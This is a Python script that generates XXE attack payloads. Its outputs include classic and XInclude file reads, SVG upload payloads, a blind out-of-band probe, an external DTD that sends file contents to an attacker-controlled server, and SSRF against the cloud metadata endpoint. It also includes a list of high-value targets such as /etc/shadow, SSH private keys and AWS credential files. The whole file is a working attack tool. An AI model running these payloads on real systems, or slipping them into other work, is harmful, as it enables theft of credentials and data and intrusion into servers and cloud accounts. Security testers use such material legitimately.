#!/usr/bin/env python3
"""
xxe_helper.py — XXE Payload Generator

Usage:
    python3 xxe_helper.py classic /etc/passwd
    python3 xxe_helper.py blind http://YOUR-OAST-DOMAIN
    python3 xxe_helper.py oob-dtd /etc/passwd http://YOUR-SERVER
    python3 xxe_helper.py svg /etc/passwd
    python3 xxe_helper.py xinclude /etc/passwd
    python3 xxe_helper.py ssrf http://169.254.169.254/latest/meta-data/
    python3 xxe_helper.py files
"""
import sys

def classic(filepath):
    print(f"\n[+] Classic XXE — read {filepath}\n")
    print(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{filepath}">
]>
<root>
  <data>&xxe;</data>
</root>""")
    print()

def blind_probe(oast):
    print(f"\n[+] Blind XXE — DNS/HTTP probe to {oast}\n")
    print(f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{oast}/xxe-probe">
]>
<root><data>&xxe;</data></root>""")
    print()

def oob_dtd(filepath, server):
    print(f"\n[+] OOB Exfiltration DTD — host this at {server}/evil.dtd\n")
    print(f"""<!ENTITY % file SYSTEM "{filepath}">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://{server}/?data=%file;'>">
%wrap;
%send;""")
    print(f"\n[+] XML payload to inject (references your DTD):\n")
    print(f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://{server}/evil.dtd">
  %dtd;
]>
<root><data>test</data></root>""")
    print(f"\n[+] DTD server:\n  python3 -m http.server 80\n  # Watch for: GET /?data=<file contents>\n")

def svg(filepath):
    print(f"\n[+] SVG XXE — upload as .svg file\n")
    print(f"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "{filepath}"> ]>
<svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>""")
    print()

def xinclude(filepath):
    print(f"\n[+] XInclude — no DOCTYPE needed, inject into any XML field\n")
    print(f"""<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="{filepath}"/>
</foo>""")
    print()

def ssrf(url):
    print(f"\n[+] XXE → SSRF — probe {url}\n")
    print(f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{url}">
]>
<root><data>&xxe;</data></root>""")
    print()

HIGH_VALUE_FILES = [
    ("Linux", [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "/proc/self/environ", "/proc/self/cmdline",
        "/app/.env", "/var/www/html/.env",
        "/root/.ssh/id_rsa", "/home/ubuntu/.aws/credentials",
        "/var/www/html/config.php", "/var/www/html/wp-config.php",
    ]),
    ("Windows", [
        "C:\\Windows\\win.ini", "C:\\inetpub\\wwwroot\\web.config",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]),
]

def show_files():
    print("\n[+] High-value files for XXE file read:\n")
    for os_name, files in HIGH_VALUE_FILES:
        print(f"  === {os_name} ===")
        for f in files:
            print(f"  {f}")
        print()

def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__); sys.exit(0)
    cmd = args[0]
    if cmd == "classic":
        classic(args[1] if len(args) > 1 else "/etc/passwd")
    elif cmd == "blind":
        blind_probe(args[1] if len(args) > 1 else "YOUR-OAST-DOMAIN")
    elif cmd == "oob-dtd":
        oob_dtd(args[1] if len(args) > 1 else "/etc/passwd",
                args[2] if len(args) > 2 else "YOUR-SERVER")
    elif cmd == "svg":
        svg(args[1] if len(args) > 1 else "/etc/passwd")
    elif cmd == "xinclude":
        xinclude(args[1] if len(args) > 1 else "/etc/passwd")
    elif cmd == "ssrf":
        ssrf(args[1] if len(args) > 1 else "http://169.254.169.254/latest/meta-data/")
    elif cmd == "files":
        show_files()
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
